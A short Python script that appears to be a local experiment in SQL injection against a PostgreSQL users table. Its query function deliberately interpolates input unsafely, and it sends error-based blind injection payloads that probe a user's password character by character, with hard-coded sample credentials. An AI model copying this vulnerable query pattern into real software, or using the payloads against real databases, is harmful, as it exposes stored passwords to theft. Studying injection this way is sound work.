import psycopg
from psycopg.rows import dict_row


def dangerous_get_user(username: str, password: str):
    unsafe_query = f"SELECT username, email FROM users WHERE username = '{username}' AND password = '{password}';"
    with psycopg.connect(
        host='localhost',
        port=5432,
        dbname='postgres',
        user='postgres',
        password='pg_secret',
        row_factory=dict_row,
    ) as conn:
        with conn.cursor() as cur:
            cur.execute(unsafe_query)
            return cur.fetchall()


username = 'ebarakoji'
password = 'aH8)m"2TH(y'
results = dangerous_get_user(username, password)
print(results)  # get user using right password


# XXX: In postgres, query is not lazy evaluated and it's difficult to execute error based blind sql injection!
toxic_username = "ebarakoji' AND (SELECT CASE WHEN (SELECT substring(password, 1, 1) = 'a' FROM users WHERE username='ebarakoji') THEN CAST(1/0 AS BOOLEAN) ELSE FALSE END); --"
try:
    results = dangerous_get_user(toxic_username, '')
    print(results)
except psycopg.errors.DivisionByZero as e:
    print(e)

# The first character is not 'b' but raises psycopg.errors.DivisionByZero because CAST(1/0 AS BOOLEAN) is evaluated anyway!
toxic_username = "ebarakoji' AND (SELECT CASE WHEN (SELECT substring(password, 1, 1) = 'b' FROM users WHERE username='ebarakoji') THEN CAST(1/0 AS BOOLEAN) ELSE FALSE END); --"
try:
    results = dangerous_get_user(toxic_username, '')
    print(results)
except psycopg.errors.DivisionByZero as e:
    print(e)
